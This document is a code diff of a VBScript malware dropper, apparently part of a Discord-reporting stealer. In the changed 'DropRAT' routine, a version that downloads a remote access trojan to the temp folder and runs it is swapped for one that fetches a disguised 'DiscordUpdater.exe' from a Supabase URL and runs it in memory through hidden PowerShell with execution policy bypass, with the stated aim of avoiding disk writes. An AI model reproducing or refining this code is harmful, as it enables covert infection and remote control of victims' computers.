@@ -146,34 +146,27 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- DropRAT ---
+' --- DropRAT (In-Memory Execution Bypass) ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1564347479430930607/1564358699412103249/OnlineDice.exe?ex=6ae0fa12&is=6adfa892&hm=254e760f21325b56861c181ea926a5b68608f1bd6c5cc3237c2370f5dc9ff830&"
     
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
-    If fso.FileExists(op) Then fso.DeleteFile op
-
-    ' Wait = True (blocks until download is 100% complete)
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True
-
-    ' Check for 3.71MB (3,890,000 bytes) to ensure it's fully written
-    Dim rDone : rDone = False
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 3000000 Then
-            rDone = True
-        End If
-    End If
-
-    If rDone Then
-        Dim dsize : dsize = fso.GetFile(op).Size
-        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
-        sh.Run op, 0, False
-        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
-    Else
-        sh.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
-        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680)
-    End If
+    ' UPDATE THIS LINK TO YOUR SUPABASE OR GITHUB URL
+    Dim dl : dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
+    
+    ' We will download the exe into memory and execute it without writing to disk
+    ' The Base64 string is decoded in memory and loaded as an assembly
+    Dim psCmd
+    psCmd = "$url = '" & dl & "'; " & _
+            "$wc = New-Object System.Net.WebClient; " & _
+            "$data = $wc.DownloadData($url); " & _
+            "$ms = New-Object System.IO.MemoryStream(,$data); " & _
+            "$asm = [System.Reflection.Assembly]::Load($ms.ToArray()); " & _
+            "$asm.EntryPoint.Invoke($null, $null)"
+            
+    ' Run the command, redirecting output to null
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & psCmd & """", 0, False
+    
+    Call PostEmbed(":white_check_mark: RAT", "Payload executed in memory.", 65280)
 End Sub
 
 ' --- Sleep Functions (Timer-Based) ---
